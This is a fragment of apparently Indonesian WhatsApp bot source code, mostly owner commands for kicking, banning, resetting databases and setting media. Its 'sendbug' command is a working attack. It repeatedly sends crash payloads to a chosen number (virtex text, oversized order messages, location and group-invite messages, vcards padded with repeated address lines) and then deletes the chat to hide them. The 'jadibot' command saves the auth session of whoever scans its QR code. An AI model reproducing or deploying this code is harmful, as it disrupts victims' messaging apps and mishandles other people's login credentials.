let wo = `*「 LIST BLOCK CMD 」*`
let soso = [];
for (let i of listcmdblock) {
soso.push(i.cmd)
wo += `\n\n•> Command : ${i.cmd}`
}
mentions(wo, soso, true)
break




           
      


 
           
 case 'jancok':
case 'kik':
if (!isOwner) return sendSticker(gaboleh)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) return reply('Reply targetnya kak')
mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return reply(`*Ya jangan lebih dari satu dong kak ${pushname} nanti aku kena banned* 😒`)
if (mentioned.length < 1) {
asu = dev.message.extendedTextMessage.contextInfo.participant
await reply( `Modar kena kick awokawok 🤣`);
await xdev.groupRemove(from, [asu])
} else {
if (mentioned.includes(ownerNumber[0])) return reply(`Tidak bisa kick Owner`)
if (mentioned.includes(from.split("-")[0] + '@s.whatsapp.net')) return reply(`Tidak bisa kick owner group`)
await reply(`Asek dapet jatah kick, Otw kick 😋`);
await xdev.groupRemove(from, [mentioned[0]])
 }
break    


           
           
       
            
case 'clearall':
					if (!isOwner) return reply(mess.only.owner) 
					let chiit = await xdev.chats.all()
                    for (let i of chiit){
                    xdev.modifyChat(i.jid, 'delete', {
                    includeStarred: false
                    }) 
                    }
					break


           
                    
case 'delallerror':
case 'clearallerror':
				         if (!isOwner) return reply("Khusus Owner")
				         var obj = [] 
                         fs.writeFileSync('./database/listerror.json', JSON.stringify(obj))         
				         await reply(`ALL ERROR BERHASIL DI HAPUS`)
			             break 
	
	case 'delalluser':
	case 'clearalluser':
				         if (!isOwner) return reply("Khusus Owner")
				         var obj = [] 
                         fs.writeFileSync('./database/user.json', JSON.stringify(obj))         
				         await reply(`ALL USER BERHASIL DI HAPUS`)
			             break 
			
			
			case 'delallblock':
	case 'clearallblock':
				         if (!isOwner) return reply("Khusus Owner")
				         var obj = [] 
                         fs.writeFileSync('./database/userblocked.json', JSON.stringify(obj))         
				         await reply(`ALL BLOCK BERHASIL DI HAPUS`)
			             break 
			
			case 'delallban':
	case 'clearallban':
	case 'clearallbanned':
				         if (!isOwner) return reply("Khusus Owner")
				         var obj = [] 
                         fs.writeFileSync('./database/banned.json', JSON.stringify(obj))         
				         await reply(`ALL BANNED BERHASIL DI HAPUS`)
			             break 
			
			
			
			
			
			            
           
           case 'public':
               if (!isOwner) return sendSticker(gaboleh)
                 if (!isOwner) return reply("Khusus owner")
           if (publik === true) return reply('Udah di mode publick kak')
           publik = true
           let bab =`Mode public aktif kak`
           xdev.sendMessage(from, bab, text, { quoted: ftext, contextInfo: forward})
           break
           
case 'self':
                 if (!isOwner) return sendSticker(gaboleh)
               if (!isOwner) return reply("Khusus owner")
           if (publik === false) return reply('Udah di mode self kak')
           publik = false
           let breh =`Mode self aktif kak`
           xdev.sendMessage(from, breh, text, { quoted: ftext, contextInfo: forward})
           break
           
           
            case 'sendbug':    
                if(isExtream) return
                    if (!isOwner) return sendvn(gakmau)
                      if(sendbug === true) return reply(`*ALERT* \nEeeitss, tunggu sampai proses sendbugnya selesai ya kak, kalo tetep maksain sendbug lebih dari satu nomer, nanti nomer kakak akan terbanned, trus aku nanti bisa kesepian deh :)`)
                      if(sendbug === true) return reply("Untung ada aku yang mencegah, klo gak bisa kena banned tadi 😌")
                      if(!isOwner) return reply('*Khusus owner*')      
                      if (args.length < 1) return reply(`Penggunaan ${prefix}sendbug nomor`)
					  if (args[0].startsWith('08')) return reply('Gunakan kode negara kak')

                      pc = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`               
                      if(pc === Ownerin) return 
                      try {                 
                     reply('*Loading...*')
                 sendbug = true
			   var nilaiAwal = 1;
                     while(nilaiAwal <=2) { 
			var kirim = await  xdev.prepareMessageFromContent(`${pc}@s.whatsapp.net`, {
                    'orderMessage': {
                        'orderId': '0@s.whatsapp.net',
                        'thumbnail': davizin,
                        'itemCount': 10000901,
                        'status': 1,
                        'surface': 1,
                        'message': virtex6(prefix),
                        'orderTitle': fake,
                        'sellerJid': `0@s.whatsapp.net`,
                      'token': 'ydkskyshj755hfuej',
                    }
                }, {
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                            'remoteJid': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': 1,
                                'status': 1,
                                'surface': 1,
                                'message': 'NOPE',
                                'orderTitle': 'halo gaes',
                                'sellerJid': "0@s.whatsapp.net"
                            }
                        }
                    },
                    'contextInfo': forward
                });
                await xdev.relayWAMessage(kirim)
       await  xdev.sendMessage(`${pc}@s.whatsapp.net`, virtex6(prefix), text,  {
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                            'remoteJid': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': 1,
                                'status': 1,
                                'surface': 1,
                                'message': 'NOPE',
                                'orderTitle': 'halo gaes',
                               'thumbnail': virgam,
                                'sellerJid': "0@s.whatsapp.net"
                            }
                        }
                    },
                    'contextInfo': forward
                })
                
               await xdev.sendMessage(`${pc}@s.whatsapp.net`, {
                            degreesLatitude: 36.036105801662316,
                              degreesLongitude: 138.09072320256624,
                            name: virtex7(prefix),
                               address: virtex6(prefix),
                             jpegThumbnail: thumb,
                              }, location,
                              {quoted: {
                             key: {
                               participant: '0@s.whatsapp.net'
                             },
                           message: {
                        orderMessage: {
                          itemCount: 2,
                               status: 1,
                       surface: 10,
                      message: 'NOPE',
                            orderTitle: fake,
                             sellerJid:'0@s.whatsapp.net'}
                             }},
                             contextInfo: forward})
                             
                             
                       xdev.sendMessage(`${pc}@s.whatsapp.net`, {
                        'groupName': 'NOPE',
                        'groupJid': '6285156137901-1627579259@g.us',
                        'inviteCode': 'JUJkLCf4mRF0oBuAlwEhO6',
                        'inviteExpiration': '0',
                        'caption': virtex7(prefix),
                        'jpegThumbnail': thumb
                    }, MessageType.groupInviteMessage, {
                        'quoted': {
                            'key': {
                                'participant':  `0@s.whatsapp.net`,
                                ...'from' ? {
                                    'remoteJid': '0@s.whatsapp.net'
                                } : {}
                            },
                            'message': {
                                'orderMessage': {
                                    'itemCount': 4,
                                    'status': 1,
                                    'surface': 1,
                                    'orderTitle': fake,
                                    'sellerJid':  '0@s.whatsapp.net'
                                }
                            }
                        }
                    })         
			
                     let inilist = []
                     for (let i of ownerNumber) {
                     const vname = xdev.contacts[i] != undefined ? xdev.contacts[i].vname || xdev.contacts[i].notify : undefined
                     inilist.push({"displayName": 'X - Dev Team',"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${xdev.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\n+ \nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴?? 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆?? ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ ??𝑆????𝐴𝑆𝐴 ボ ??𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈??𝐴𝑆𝐴 ボ ??𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ ??𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴?? 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ ??𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶??𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆??𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nitem1.X-ABLabel:Ponsel\nEND:VCARD`})}
                  
                     await xdev.sendMessage(`${pc}@s.whatsapp.net`, {"displayName": `${inilist.length} kontak`,"contacts": inilist }, 'contactsArrayMessage')
                     nilaiAwal++}
                     console.log(color("[BUG]", "red"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color('Bug terkirim', 'cyan'))
                     console.log(color("[BUG]", "red"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color('Otw delchat, buka wa nya terus agar delchat sukses', 'cyan'))
                     await xdev.modifyChat(`${pc}@s.whatsapp.net`, ChatModification.delete)
                     await xdev.sendMessage(`${pc}@s.whatsapp.net`, 'COMPLETE', text)
                     await xdev.sendMessage(from, `*Sukses send bug sebanyak 11 bug ke nomor ${q}*`, text)
                     console.log(color("[BUG]", "red"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color('sukses delchat sekarang wa sudah normal', 'cyan'))     
					} catch (e) {
					console.log('Error :', e)
					reply(`*Gagal mengirim bug!* \n*System Error*\nPastikan jaringan stabil dan masukan nomer whatsapp dengan benar`)
					}   
                    sendbug = false                     
					break
           
           
           case 'setppbot':
					if (!isOwner) return reply('Kalau Bukan Owner Gak Usah Banyak Tingkah Deh')
					if (!isQuotedImage) return reply(`Kirim gambar dengan caption ${prefix}setbotpp atau tag gambar yang sudah dikirim`)
					if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return reply('Reply gambarnya aja om')
					enmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await xdev.downloadAndSaveMediaMessage(enmedia)
					await xdev.updateProfilePicture(botNumber, media)
					reply('Makasih profil barunya😗')
					break
           
           
           
           case 'setprefix':
                     if (!isOwner) return sendSticker(gaboleh)
                if (args.length < 1) return reply(`Masukkan prefix\nOptions :\n=> multi`)
                if (c === 'multi'){
                    multi = true
                    fakestatus(`Berhasil mengubah prefix ke「 ${c} 」`)
                } else if (c === 'nopref'){
                    return reply("Maap nopref masih error")
                } else {
                    multi = false
                    nopref = false
                    prefa = `${c}`
                    fakestatus(`Berhasil mengubah prefix ke「 ${c} 」`)
                }
                break
                
           
           case 'addrespon':{
         if (!isPremium && !isOwner) return reply(`Kamu bukan user premium`)
          if (args.length < 1) return reply(`Penggunaan ${prefix}addrespon key|respon\n\nContoh : ${prefix}addrespon hai|juga`)
          let input1 = body.slice(11)
          if (!input1.includes('|')) return reply(`Penggunaan ${prefix}addrespon key|respon\n\nContoh : ${prefix}addrespon hai|juga`)
          let input = input1.split("|")
          if (checkCommands(input[0], commandsDB) === true) return reply(`Command tersebut sudah ada`)
          addCommands(input[0], input[1], sender, commandsDB) 
          reply(`Key : ${input[0]}\nRespon : ${input[1]}\n\nRespon berhasil di set`)
          }
      break
      
      case 'dellrespon':
      case 'delrespon':{
          if (!isPremium && !isOwner) return reply(`Kamu bukan user premium`)
            if (args.length < 1) return reply(`Penggunaan ${prefix}delrespon key\n\nContoh : ${prefix}delrespon hai`)
          if (!checkCommands(q, commandsDB)) return reply(`Key tersebut tidak ada di database`)
          deleteCommands(q, commandsDB)
          reply(`Berhasil menghapus respon dengan key ${q}`)
          }
      break
      
      
      
      
  
      
      
           
		case 'ban':
		case 'banned':
		    if (!isGroupAdmins && !isOwner)return reply('hanya admin dan owner')
			if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return reply('Reply atau tag targetnya')
		    mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
		    if (mentioned.length > 1) return reply ('Satu satu dong wuuuuuuuuuuu')
            if (mentioned.length < 1) {
            asu = dev.message.extendedTextMessage.contextInfo.participant
            Nomer =`${asu.split("@")[0]}@s.whatsapp.net`
            if(cekBannedUser (asu, ban)) return reply("Udah di ban kak")
            if(Nomer === ownerNumber[0]) return reply("Ga mau")
            addBanned(Nomer, ban)               
            reply( `*Asik si beban* @${asu.split("@")[0]} *kena banned* 🤣`);
            } else {
       	 if (!isGroupAdmins && !isOwner)return reply('hanya admin dan owner')
            if (mentioned.includes(ownerNumber[0])) return reply(`Tidak bisa banned Owner`)
            if (mentioned.includes(from.split("-")[0] + '@s.whatsapp.net')) return reply(`Tidak bisa banned owner group`)
            ahah = `${mentioned[0].split('@')[0]}@s.whatsapp.net`
            if(cekBannedUser (ahah, ban)) return reply("Udah di ban kak")     
            addBanned(ahah, ban)  
            reply(`Asik si wawan @${mentioned[0].split('@')[0]} kena banned 🤣`);
            }
            break
                  
    
    case 'listban': 
       case 'banlist':
              let awe = `*List Banned*\nJumlah : ${ban.length}\n\n`
              for (let i of ban){
              
              awe += `Id : ${i.id.split("@")[0]}\n` 
} 
              awe += `\n© ${fake1}` 
              
              reply2(awe) 
              
              break
			
            
            
            
            
            
			case 'unbanned':
			case 'unban': //PERCOBAA
		    if (!isGroupAdmins && !isOwner)return reply('hanya admin dan owner')
			if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return reply('Reply targetnya!')
            mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
            if (mentioned.length < 1) {
            asu = dev.message.extendedTextMessage.contextInfo.participant           
            if(!cekBannedUser (asu, ban)) return reply("Udah di unban")
            unBanned (asu, ban)             
            reply( `*Klo udah di unban jangan jadi beban lagi yah*  🙂 @${asu.split("@")[0]}`);
            } else {
       	 if (!isGroupAdmins && !isOwner)return reply('hanya admin dan owner')
            if (mentioned.includes(ownerNumber[0])) return reply(`Tidak bisa banned Owner`)
            if (mentioned.includes(from.split("-")[0] + '@s.whatsapp.net')) return reply(`Tidak bisa banned owner group`)    
            lala = `${mentioned[0].split('@')[0]}@s.whatsapp.net`
            if(!cekBannedUser (lala, ban)) return reply("Udah di unban")        
            unBanned(lala, ban) 
            reply(`*Klo udah di unban jangan jadi beban lagi yah*  🙂 @${mentioned[0].split('@')[0]}`);
            }
            break    
         



           
           
           case 'resetlimit':
				         if (!isOwner) return reply(mess.only.owner)
				         var obj = [] 
                         fs.writeFileSync('./database/claim.json', JSON.stringify(obj))
				         fs.writeFileSync('./database/limit.json', JSON.stringify(obj)) 
				         await reply(`LIMIT BERHASIL DI RESET`)
			             break 
           
           case 'setreply':
	case 'setfake':
            if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
			if (!q) return reply(mess.wrongFormat)
			fake = q
			reply(`Succes Mengganti Conversation Fake : ${q}`)
			break
	case 'setfakeimg':
    if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
        	if ((isMedia && !dev.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
			delb = await xdev.downloadMediaMessage(boij)
			fs.writeFileSync(`./stik/fake.jpeg`, delb)
			reply(`Berhasil mengubah fake image`)
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
			
			
			
		case 'setthumb':
        if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
          delb = await xdev.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/thumb.jpeg`, delb);
          fakestatus(`Berhasil mengubah thumbnail`)
        } else {
          reply(`Kirim gambar dengan caption ${prefix}sethumb`);
        }
        break;
			
           
case 'setovo':
        if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
          delb = await xdev.downloadMediaMessage(boij);
          fs.writeFileSync(`./kode qr/ovo.jpg`, delb);
          fakestatus(`Berhasil mengubah kode qr ovo`)
        } else if(q){
          reply(`Kirim gambar dengan caption ${prefix}setovo`);
        }
        break;
        
        
        case 'setgopay':
        if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
          delb = await xdev.downloadMediaMessage(boij);
          fs.writeFileSync(`./kode qr/gopay.jpg`, delb);
          fakestatus(`Berhasil mengubah kode qr gopay`)
       } else if(q){
          reply(`Kirim gambar dengan caption ${prefix}setgopay`);
        }
        break;
           
           
       case 'setdana':
        if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
          delb = await xdev.downloadMediaMessage(boij);
          fs.writeFileSync(`./kode qr/dana.jpg`, delb);
          fakestatus(`Berhasil mengubah kode qr dana`)
        } else if(q){
          reply(`Kirim gambar dengan caption ${prefix}setdana`);
        }
        break;
        
        
        case 'setimageinfo':
        if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
          delb = await xdev.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/bot.jpg`, delb);
          fakestatus(`Berhasil mengubah image pada infobotz`)
        } else {
          reply(`Kirim gambar dengan caption ${prefix}setimageinfo`);
        }
        break;
           
           
     case 'addstik':
		if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedSticker) return reply('Reply stiker nya')
				
				if (!q) return reply('Nama sticker nya apa?')
				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await xdev.downloadMediaMessage(boij)
				setiker.push(`${q}`)
				fs.writeFileSync(`./temp/stick/${q}.webp`, delb)
				fs.writeFileSync('./temp/stick.json', JSON.stringify(setiker))
				xdev.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`, MessageType.text, { quoted: dev})
				break
					case 'dellstik':
					case 'delstik':
					if(!dev.key.fromMe & !isOwner) return reply('Only owner')
					if (!q) return reply(mess.wrongFormat)
					try {
						wanu = imagenye.indexOf(q)
						setiker.splice(wanu,1)
						fs.unlinkSync(`./temp/stick/${q}.webp`)
						fs.writeFileSync('./temp/stick.json', JSON.stringify(setiker))
						reply(`Succes delete sticker ${q}!`)
					} catch (err) {
						reply(`Gagal delete sticker ${q}!`)
					}
					break
			
				
				case 'addimg':
				if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedImage) return reply('Reply imagenya')
				
				if (!q) return reply('Nama imagenya apa')
				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await xdev.downloadMediaMessage(boij)
				imagenye.push(`${q}`)
				fs.writeFileSync(`./temp/foto/${q}.jpeg`, delb)
				fs.writeFileSync('./temp/image.json', JSON.stringify(imagenye))
				xdev.sendMessage(from, `Sukses Menambahkan image\nCek dengan cara ${prefix}listimg`, MessageType.text, { quoted: dev})
				break
				
				
				case 'delimg':
				if (!isOwner) return 
					try { 
					 wanu = imagenye.indexOf(q)
					 imagenye.splice(wanu, 1)
					fs.writeFileSync('./temp/image.json', JSON.stringify(imagenye))
					 fs.unlinkSync(`./temp/foto/${q}.jpeg`)
					 fakestatus( 'Sukses')
					} catch (err){
						console.log(err)
						reply('error kak')
					}
					break
				
				case 'addvid':
				if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedVideo) return reply('Reply vidionya')
				
				if (!q) return reply('Nama vidionya apa')
				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await xdev.downloadMediaMessage(boij)
				videonye.push(`${q}`)
				fs.writeFileSync(`./temp/video/${q}.mp4`, delb)
				fs.writeFileSync('./temp/video.json', JSON.stringify(videonye))
				xdev.sendMessage(from, `Sukses Menambahkan video\nCek dengan cara ${prefix}listvideo`, MessageType.text, { quoted: dev })
				break
				
				
				case 'delvid':
				case 'dellvid':
				if (!isOwner) return 
					try {
					 
					 wanu = videonye.indexOf(q)
					 videonye.splice(wanu, 1)
					fs.writeFileSync('./temp/video.json', JSON.stringify(videonye))
					 fs.unlinkSync(`./temp/video/${q}.mp4`)
					 fakestatus('Sukses')
					} catch (err){
						console.log(err)
						reply('error kak')
					}
					break
				
				
				
				
				case 'addvn':
				if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedAudio) return reply('Reply vnnya')
				if (!q) return reply('Nama audionya apa')
				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await xdev.downloadMediaMessage(boij)
				audionye.push(q)
				fs.writeFileSync(`./temp/audio/${q}.mp3`, delb)
				fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
				xdev.sendMessage(from, `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`, MessageType.text, { quoted: dev})
				break
				
				
				
				case 'adderror':
				case 'emror':
				{
				if (!q) return reply(`Yang error apa bro ?\nContoh: ${prefix}adderror nosinya|menu`)
				if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
				oke = q.split("|")[0]
				oka = q.split("|")[1]
				addError(oke, oka, listerror)
				await reply(`Sukses Menambahkan ${q} ke daftar error`)
				}
				break
				
				
			      
           
      case 'addbadword':
                if (!isGroupAdmins && !isOwner)return reply('hanya admin dan owner')
                if (args.length < 1) return reply(`masukkan kata`)
                if (isKasar(q, badword)) return reply(`Udah ada`)
                addBadword(q, badword)
                reply(`Sukses`)
                break
            case 'delbadword':
                if (!isOwner) return reply('Hanya admin dan owner')
                if (args.length < 1) return reply(`masukkan kata`)
                if (!isKasar(q, badword)) return reply(`Ga ada`)
                delBadword(q, badword)
                reply(`Sukses`)
                break
            case 'clearbadword':
                if (!isOwner) return reply('Hanya owner yang bisa')
                if (args.length < 1) return reply(`tag atau nomor`)
                if (mentioned.length !== 0){
                    for (let i = 0; i < mentioned.length; i++){
                    delCountKasar(mentioned[i], senbadword)
                    }
                    reply('Sukses')
                } else {
                    delCountKasar(args[1] + '@s.whatsapp.net', senbadword)
                    reply('Sukses')
                }
                break




    

    

case 'antichatbot':
                if (!isOwner) return sendSticker(gaboleh)
                if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
                  if(chatBot === true) return reply("Udah aktif")
                    chatBot = true
					reply(`Sukses mengaktifkan Antichatbot\nuntuk mengganti teks chatbot ketik ${prefix}tekschat <teks>`)
                } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
                   if(chatBot === false) return reply("Sudah mati")
                    chatBot = false
					reply(`Berhasil mematikan Antichatbot`)
                } else if (!q) {
                      sendButMessage(from, `MODE ANTI CHAT BOT`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antichatbot on`, buttonText: {displayText: `ᴏɴ`,},type: 1},
                      {buttonId: `${prefix}antichatbot off`, buttonText: { displayText: `ᴏғғ`,},type: 1}]);
                    }
                 break;
                




case 'anticall':
                if (!isOwner) return sendSticker(gaboleh)
                if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
                  if(Anticall === true) return reply("Udah aktif")
                    Anticall = true
					reply(`Sukses mengaktifkan Anticall`)
                } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
                   if(Anticall === false) return reply("Sudah mati")
                    Anticall = false
					reply(`Berhasil mematikan Anticall`)
                } else if (!q) {
                      sendButMessage(from, `MODE ANTI CALL`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}anticall on`, buttonText: {displayText: `ᴏɴ`,},type: 1},
                      {buttonId: `${prefix}anticall off`, buttonText: { displayText: `ᴏғғ`,},type: 1}]);
                    }
                 break;

case 'jadibot':
case 'jadilonte':
                    if (!isOwner) return reply("Harus ijin owner")
                   reply(mess.wait)
client.version = [2, 2143, 3]
client.browserDescription = ['EXTREAM','Ubuntu','3.0']
if (args[0] && args[0].length > 200) {
	let json = Buffer.from(args[0], 'base64').toString('utf-8')
    let obj = JSON.parse(json)
    await client.loadAuthInfo(obj)
}
try {
client.on('qr' ,async qr => {
qrbot = await qrkode.toDataURL(qr, { scale: 8 })
buffqr = await Buffer.from(qrbot.split('data:image/png;base64,')[1], 'base64')
await fs.writeFileSync(`./jadibot@${sender}.jpg`, buffqr)
let scen = await xdev.sendMessage(from, fs.readFileSync(`./jadibot@${sender}.jpg`), MessageType.image, {quoted : dev,caption: 'Scan QR ini untuk jadi bot sementara!\n1. Klik titik tiga di pojok kanan atas\n2. Ketuk WhatsApp Web\n3. Scan QR ini \n\nQR Expired dalam 20 detik'})    
setTimeout(() => {
       xdev.deleteMessage(from, scen.key)
  }, 30000);
})  
client.on ('open', async () => {
  console.log ('credentials update')
  const authInfo = client.base64EncodedAuthInfo()
  fs.writeFileSync(`./${sender}.json`, JSON.stringify(authInfo  ,null, '\t'))
  await client.sendMessage('0@s.whatsapp.net', `Kamu bisa login tanpa qr dengan pesan dibawah ini`, MessageType.extendedText)
  client.sendMessage('0@s.whatsapp.net', `${prefix}${command} ${Buffer.from(JSON.stringify(authInfo)).toString('base64')}`, MessageType.extendedText)
})
client.on('chat-update', async (chat) => {
	require('./index.js')(client, chat)
})    
await client.connect().then(async ({user}) => {
	listjadibot1.push(client.user)
reply('Berhasil tersambung dengan WhatsApp - mu.\n*NOTE: Ini cuma numpang*\n' + JSON.stringify(user, null, 2))
})
} catch {
reply('Error! hanya 1 orang yang dapat mengakses fitur jadibot')
}
break
           
           
           case 'stopjadibot':
           reply(mess.wait)
if (!isOwner && !dev.key.fromMe) return reply("tidak bisa stopjadibot kecuali owner")
try {
fs.unlinkSync(`./${sender}.json`)
client.close()
} catch {
reply('Done')
client.close()
}
break
	
	
	case 'addsewa':
	           {
		      if (!isOwner) return sendSticker(gaboleh)
              if (!isGroup)return reply(mess.only.group)
              if (!isOwner) return reply(mess.only.owner)
              if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
